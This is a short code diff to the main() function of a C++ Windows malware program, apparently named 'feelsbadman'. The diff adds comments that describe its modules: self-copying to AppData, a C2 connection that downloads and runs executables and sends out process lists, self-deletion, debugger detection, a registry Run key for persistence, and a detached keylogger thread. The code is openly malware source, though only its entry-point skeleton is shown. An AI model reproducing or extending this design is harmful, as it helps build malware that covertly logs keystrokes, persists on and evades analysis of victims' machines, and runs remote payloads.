@@ -18,13 +18,13 @@ int main()
 	FreeConsole();
 
 	// instantiate modules
-	CP copyModule;
-	C2 connModule;
-	RM remvModule;
-	DB debgModule;
-	RG regsModule;
-	MP msptModule;
-	UTIL util;
+	CP copyModule;			// copies feelsbadman.exe to AppData/Roaming/clone.exe
+	C2 connModule;			// connects to C2 server: downloads and runs .exe, exfiltrates running processes
+	RM remvModule;			// removes/deletes the feelsbadman.exe
+	DB debgModule;			// checks for running debugger
+	RG regsModule;			// adds registry RUN key for clone.exe
+	MP msptModule;			// checks if microsoft paint is running and closes it
+	UTIL util;				// utility for facilitating all modules
 	
 	if (!util.isExecutingFromAppData()) {
 		copyModule.execute();
@@ -33,6 +33,7 @@ int main()
 		return 0;
 	}
 
+	// start new thread for key logger and detach from main thread
 	thread keylogger(keyLoop);
 	keylogger.detach();
 
